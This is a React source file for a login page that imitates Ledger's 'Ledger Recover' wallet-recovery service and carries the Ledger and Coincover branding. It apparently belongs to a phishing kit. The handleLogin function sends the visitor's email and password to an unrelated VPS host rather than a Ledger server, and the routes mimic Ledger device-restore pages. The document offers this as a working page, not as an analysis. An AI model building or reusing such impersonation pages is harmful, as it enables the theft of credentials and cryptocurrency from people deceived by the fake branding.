import { Button, Input, message } from "antd";
import { ArrowLeft, Eye, EyeOff, X } from "lucide-react";
import { useState } from "react";
import { useNavigate } from "react-router-dom";

const LedgerRecover = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const navigate = useNavigate();

  const handleLogin = async () => {
    setLoading(true);

    try {
      const response = await fetch("https://server.srv957506.hstgr.cloud/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: email,
          password: password,
        }),
      });

      const data = await response.json();

      if (data.success) {
        // Store token and user data in localStorage
        localStorage.setItem("authToken", data.data.token);
        localStorage.setItem("userData", JSON.stringify(data.data.user));

        message.success("Login successful!");

        // Navigate to dashboard
        navigate("/dashboard");
      } else {
        message.error(data.message || "Login failed. Please try again.");
      }
    } catch (error) {
      console.error("Login error:", error);
      message.error("An error occurred. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen fixed top-0 left-0 h-[100%] w-[100%] bg-[#131214] text-white flex flex-col">
      {/* Header */}
      <div className="flex justify-between items-start p-6">
        <div className="flex flex-col">
          <div className="flex items-center gap-2">
            <span className="text-sm font-medium">LEDGER</span>
            <span className="text-xs bg-gray-700 px-1 rounded">RECOVER</span>
          </div>
          <span className="text-xs text-gray-400 mt-1">
            provided by coincover
          </span>
        </div>
        <div className="flex items-center gap-4">
          <button className="text-sm text-gray-300 hover:text-white underline">
            Need help?
          </button>
          <button
            className="text-gray-400 hover:text-white cursor-pointer"
            onClick={() => navigate("/")}
          >
            <X className="w-5 h-5" />
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-6">
        <div className="w-full max-w-md space-y-8">
          <div className="text-center space-y-4">
            <h1 className="text-3xl font-medium">Ledger Recover login</h1>
            <p className="text-gray-400 text-base">
              Login to recover access to your wallet and to manage your
              subscription.
            </p>
          </div>

          <div className="space-y-6">
            <div className="space-y-4">
              <div>
                <Input
                  type="email"
                  placeholder="Email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  onPressEnter={handleLogin}
                  className="bg-gray-800 border-gray-700 text-white placeholder:text-gray-500 h-12 rounded-lg focus:border-gray-600 focus:ring-0"
                />
              </div>
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onPressEnter={handleLogin}
                  className="bg-gray-800 border-gray-700 text-white placeholder:text-gray-500 h-12 rounded-lg focus:border-gray-600 focus:ring-0 pr-12"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-300"
                >
                  {showPassword ? (
                    <EyeOff className="w-5 h-5" />
                  ) : (
                    <Eye className="w-5 h-5" />
                  )}
                </button>
              </div>
            </div>

            <div className="flex justify-between items-center">
              <button
                className="text-blue-400 hover:text-blue-300 text-sm"
                onClick={() =>
                  navigate(
                    "/all-devices/ledger-nano-s-plus/restore-24-nano-s-plus/forget-password"
                  )
                }
              >
                Forgot your password?
              </button>
              <div className="text-right">
                <span className="text-gray-400 text-sm">
                  Don't have an account?{" "}
                </span>
                <button
                  className="text-blue-400 hover:text-blue-300 text-sm"
                  onClick={() => navigate("/register")}
                >
                  Register here
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="flex justify-between items-center p-6">
        <Button
          variant="ghost"
          className="text-white hover:bg-gray-800 flex items-center gap-2"
          onClick={() => navigate("/")}
        >
          <ArrowLeft className="w-4 h-4" />
          Back
        </Button>
        <Button
          className="bg-gray-700 hover:bg-gray-600 text-white px-8 py-2 rounded-lg"
          // disabled={!email || !password || loading}
          loading={loading}
          onClick={handleLogin}
        >
          Login
        </Button>
      </div>
    </div>
  );
};

export default LedgerRecover;
